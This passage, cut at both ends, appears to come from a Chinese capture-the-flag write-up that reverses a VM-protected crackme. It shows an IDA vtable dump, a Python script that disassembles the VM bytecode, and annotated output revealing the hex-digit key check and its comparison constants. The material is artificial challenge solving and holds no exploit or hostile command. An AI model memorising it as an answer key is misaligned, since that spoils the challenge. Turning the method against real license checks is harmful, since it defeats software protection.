class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.rdata:004031CC ; const RE::`vftable&apos;</span><br><span class="line">.rdata:004031CC ??_7RE@@6B@     dd offset assign_hi     ; DATA XREF: sub_4016A0+46↑o</span><br><span class="line">.rdata:004031D0                 dd offset get_par_hi</span><br><span class="line">.rdata:004031D4                 dd offset inc_ip</span><br><span class="line">.rdata:004031D8                 dd offset get_par_lo</span><br><span class="line">.rdata:004031DC                 dd offset dec_assign_hi</span><br><span class="line">.rdata:004031E0                 dd offset add_to_hi</span><br><span class="line">.rdata:004031E4                 dd offset subs_to_hi</span><br><span class="line">.rdata:004031E8                 dd offset inc_assign_hi</span><br><span class="line">.rdata:004031EC                 dd offset xor_to_hi</span><br><span class="line">.rdata:004031F0                 dd offset and_to_hi</span><br><span class="line">.rdata:004031F4                 dd offset mul_to_hi</span><br><span class="line">.rdata:004031F8                 dd offset mod_to_hi</span><br><span class="line">.rdata:004031FC                 dd offset push_hi</span><br><span class="line">.rdata:00403200                 dd offset assign_lo_to_hi</span><br><span class="line">.rdata:00403204                 dd offset load_to_hi</span><br><span class="line">.rdata:00403208                 dd offset push</span><br><span class="line">.rdata:0040320C                 dd offset pop</span><br><span class="line">.rdata:00403210                 dd offset store</span><br><span class="line">.rdata:00403214                 dd offset j_flag_neg1</span><br><span class="line">.rdata:00403218                 dd offset j_flag_1</span><br><span class="line">.rdata:0040321C                 dd offset j_not_flag</span><br><span class="line">.rdata:00403220                 dd offset jmp_bck_cnt</span><br><span class="line">.rdata:00403224                 dd offset cmp_hi_to_lo</span><br><span class="line">.rdata:00403228                 dd offset inc_mem_ptr</span><br><span class="line">.rdata:0040322C                 dd offset dec_mem_ptr</span><br><span class="line">.rdata:00403230                 dd offset xor_block</span><br><span class="line">.rdata:00403234                 dd offset init_regs</span><br><span class="line">.rdata:00403238                 dd offset get_res</span><br><span class="line">.rdata:0040323C                 dd offset execute_vm</span><br></pre></td></tr></table></figure><p>其中名字中<code>hi</code>表示目标寄存器编号，<code>lo</code>表示源寄存器编号，<code>execute_vm</code>是执行虚拟机代码的函数，执行程序中硬编码的一段虚拟机指令。在ida中新建一个结构，将各个偏移的名字填上虚表函数名，就可以在<code>execute_vm</code>中看到<code>opcode</code>所对应的具体函数是什么了。通过分析这些函数的操作也很容易确定虚拟机的结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00000000 Vm              </span><br><span class="line">00000000 vtable          dd ?                   </span><br><span class="line">00000004 reg0            dd ?</span><br><span class="line">00000008 reg1            dd ?</span><br><span class="line">0000000C reg2            dd ?</span><br><span class="line">00000010 cnt             dd ?</span><br><span class="line">00000014 flag            dd ?</span><br><span class="line">00000018 maybe_mem       dd ?</span><br><span class="line">0000001C field_1C        dd ?</span><br><span class="line">00000020 stack           dd ?</span><br><span class="line">00000024 ip_ptr          dd ?</span><br></pre></td></tr></table></figure><p>于是可以写python脚本将opcode还原成易读的伪汇编语言的形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">85</span>, <span class="number">5</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">34</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">75</span>, <span class="number">51</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">84</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">77</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">68</span>, <span class="number">22</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">84</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">68</span>, <span class="number">11</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">84</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">5</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">85</span>, <span class="number">64</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">51</span>, <span class="number">180</span>, <span class="number">136</span>, <span class="number">172</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">74</span>, <span class="number">11</span>, <span class="number">148</span>, <span class="number">63</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">124</span>, <span class="number">92</span>, <span class="number">220</span>, <span class="number">236</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">57</span>, <span class="number">41</span>, <span class="number">117</span>, <span class="number">27</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">30</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">131</span>, <span class="number">141</span>, <span class="number">181</span>, <span class="number">46</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">2</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>]</span><br><span class="line"></span><br><span class="line">opcodes = &#123;</span><br><span class="line">  <span class="number">67</span>: (<span class="string">"return result"</span>, <span class="number">1</span>),</span><br><span class="line">  <span class="number">68</span>: (<span class="string">"j_flag_neg1"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">69</span>: (<span class="string">"mod_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">70</span>: (<span class="string">"load_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">71</span>: (<span class="string">"xor_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">72</span>: (<span class="string">"cmp_hi_to_lo"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">73</span>: (<span class="string">"inc_mem_ptr"</span>, <span class="number">1</span>),</span><br><span class="line">  <span class="number">74</span>: (<span class="string">"and_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">75</span>: (<span class="string">"j_not_flag"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">76</span>: (<span class="string">"xor_block"</span>, <span class="number">16</span>),</span><br><span class="line">  <span class="number">77</span>: (<span class="string">"j_flag_1"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">78</span>: (<span class="string">"dec_assign_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">79</span>: (<span class="string">"push"</span>, <span class="number">5</span>),</span><br><span class="line">  <span class="number">80</span>: (<span class="string">"inc_assign_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">81</span>: (<span class="string">"assign_lo_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">82</span>: (<span class="string">"push hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">83</span>: (<span class="string">"add_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">84</span>: (<span class="string">"pop hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">85</span>: (<span class="string">"jmp_bck_cnt"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">86</span>: (<span class="string">"dec_mem_ptr"</span>, <span class="number">1</span>),</span><br><span class="line">  <span class="number">87</span>: (<span class="string">"store hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">88</span>: (<span class="string">"mul_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">89</span>: (<span class="string">"subs_to_hi"</span>, <span class="number">2</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pc = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> pc != len(code):</span><br><span class="line">  opcode = code[pc]</span><br><span class="line">  name = opcodes[opcode][<span class="number">0</span>]</span><br><span class="line">  length = opcodes[opcode][<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"%03x\t"</span> % pc, </span><br><span class="line">  <span class="keyword">print</span> name, </span><br><span class="line">  <span class="keyword">if</span> length == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    pc += <span class="number">1</span></span><br><span class="line">  <span class="keyword">elif</span> length == <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'hi'</span> <span class="keyword">in</span> name:</span><br><span class="line">      <span class="keyword">print</span> code[pc+<span class="number">1</span>] &gt;&gt; <span class="number">4</span>, code[pc+<span class="number">1</span>] &amp; <span class="number">0xf</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">print</span> hex(code[pc+<span class="number">1</span>])</span><br><span class="line">    pc += <span class="number">2</span></span><br><span class="line">  <span class="keyword">elif</span> length == <span class="number">5</span>:</span><br><span class="line">    num = (code[pc+<span class="number">1</span>] &lt;&lt; <span class="number">24</span>) | (code[pc+<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (code[pc+<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | (code[pc+<span class="number">4</span>] &lt;&lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(num)</span><br><span class="line">    pc += <span class="number">5</span></span><br><span class="line">  <span class="keyword">elif</span> length == <span class="number">16</span>:</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">      code[i + pc + <span class="number">1</span>] ^= <span class="number">0x66</span></span><br><span class="line">    pc += <span class="number">16</span></span><br></pre></td></tr></table></figure><p>运行得到如下输出（输出中注释是分析过程）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line">000 push 0x2f</span><br><span class="line">005 jmp_bck_cnt 0x5</span><br><span class="line">007 pop hi 3 0</span><br><span class="line">009 load_to_hi 0 0</span><br><span class="line">00b xor_to_hi 2 2</span><br><span class="line">00d cmp_hi_to_lo 0 2</span><br><span class="line">00f j_not_flag 0x33 =&gt; 0x44</span><br><span class="line">011 inc_mem_ptr</span><br><span class="line">012 push 0x46</span><br><span class="line">017 pop hi 1 0</span><br><span class="line">019 cmp_hi_to_lo 0 1</span><br><span class="line">01b j_flag_1 0x27 =&gt; 0x44</span><br><span class="line">01d push 0x30</span><br><span class="line">022 pop hi 1 0</span><br><span class="line">024 cmp_hi_to_lo 0 1</span><br><span class="line">026 j_flag_neg1 0x16 =&gt; 0x3e</span><br><span class="line">028 push 0x39</span><br><span class="line">02d pop hi 1 0</span><br><span class="line">02f cmp_hi_to_lo 0 1</span><br><span class="line">031 j_flag_neg1 0xb =&gt; 0x3e</span><br><span class="line">033 push 0x41</span><br><span class="line">038 pop hi 0 1</span><br><span class="line">03a cmp_hi_to_lo 0 1</span><br><span class="line">03c j_flag_neg1 0x6 =&gt; 0x44</span><br><span class="line">03e xor_to_hi 0 0</span><br><span class="line">040 cmp_hi_to_lo 0 0</span><br><span class="line">042 j_not_flag 0x5 =&gt; 0x49</span><br><span class="line">fail:</span><br><span class="line">044 xor_to_hi 0 0</span><br><span class="line">046 inc_assign_hi 0 0</span><br><span class="line">048 return result</span><br><span class="line">049 jmp_bck_cnt 0x40</span><br><span class="line">(check hex digits)</span><br><span class="line"></span><br><span class="line">04b push 0x7        </span><br><span class="line">050 pop hi 3 0      // cnt = 0x7</span><br><span class="line">052 xor_to_hi 1 1   // reg[1] = 0</span><br><span class="line">back:</span><br><span class="line">054 dec_mem_ptr</span><br><span class="line">055 load_to_hi 0 0  // reg[0] = c</span><br><span class="line">057 push 0x30</span><br><span class="line">05c pop hi 2 0      // reg[2] = 0x30</span><br><span class="line">05e subs_to_hi 0 2  // c-=0x30</span><br><span class="line">060 push 0xa</span><br><span class="line">065 pop hi 2 0      // reg[2] = 10</span><br><span class="line">067 cmp_hi_to_lo 0 2</span><br><span class="line">069 j_flag_neg1 0x9 // c &lt; 10 =&gt; less_than_10</span><br><span class="line">06b push 0x7</span><br><span class="line">070 pop hi 2 0      // reg[2] = 7</span><br><span class="line">072 subs_to_hi 0 2  // c-=7</span><br><span class="line">less_than_10:</span><br><span class="line">074 push 0x10</span><br><span class="line">079 pop hi 2 0</span><br><span class="line">07b mul_to_hi 1 2   i &lt;&lt; 4</span><br><span class="line">07d add_to_hi 1 0   i += c</span><br><span class="line">07f jmp_bck_cnt 0x2b =&gt; back</span><br><span class="line">081 push 0x33b488ac</span><br><span class="line">086 pop hi 2 0</span><br><span class="line">088 cmp_hi_to_lo 1 2</span><br><span class="line">08a xor_to_hi 0 0</span><br><span class="line">08c j_not_flag 0x3</span><br><span class="line">08e inc_assign_hi 0 0</span><br><span class="line">090 return result</span><br><span class="line">(后七个字符为 &quot;33b488ac&quot;[::-1])</span><br><span class="line"></span><br><span class="line">091 push 0x7</span><br><span class="line">096 pop hi 3 0</span><br><span class="line">098 xor_to_hi 1 1</span><br><span class="line">09a dec_mem_ptr</span><br><span class="line">09b load_to_hi 0 0</span><br><span class="line">09d push 0x30</span><br><span class="line">0a2 pop hi 2 0</span><br><span class="line">0a4 subs_to_hi 0 2</span><br><span class="line">0a6 push 0xa</span><br><span class="line">0ab pop hi 2 0</span><br><span class="line">0ad cmp_hi_to_lo 0 2</span><br><span class="line">0af j_flag_neg1 0x9</span><br><span class="line">0b1 push 0x7</span><br><span class="line">0b6 pop hi 2 0</span><br><span class="line">0b8 subs_to_hi 0 2</span><br><span class="line">0ba push 0x10</span><br><span class="line">0bf pop hi 2 0</span><br><span class="line">0c1 mul_to_hi 1 2</span><br><span class="line">0c3 add_to_hi 1 0</span><br><span class="line">0c5 jmp_bck_cnt 0x2b</span><br><span class="line">0c7 push 0x4a0b943f</span><br><span class="line">0cc pop hi 2 0</span><br><span class="line">0ce cmp_hi_to_lo 1 2</span><br><span class="line">0d0 xor_to_hi 0 0</span><br><span class="line">0d2 j_not_flag 0x3</span><br><span class="line">0d4 inc_assign_hi 0 0</span><br><span class="line">0d6 return result</span><br><span class="line">0d7 push 0x7</span><br><span class="line">0dc pop hi 3 0</span><br><span class="line">0de xor_to_hi 1 1</span><br><span class="line">0e0 dec_mem_ptr</span><br><span class="line">0e1 load_to_hi 0 0</span><br><span class="line">0e3 push 0x30</span><br><span class="line">0e8 pop hi 2 0</span><br><span class="line">0ea subs_to_hi 0 2</span><br><span class="line">0ec push 0xa</span><br><span class="line">0f1 pop hi 2 0</span><br><span class="line">0f3 cmp_hi_to_lo 0 2</span><br><span class="line">0f5 j_flag_neg1 0x9</span><br><span class="line">0f7 push 0x7</span><br><span class="line">0fc pop hi 2 0</span><br><span class="line">0fe subs_to_hi 0 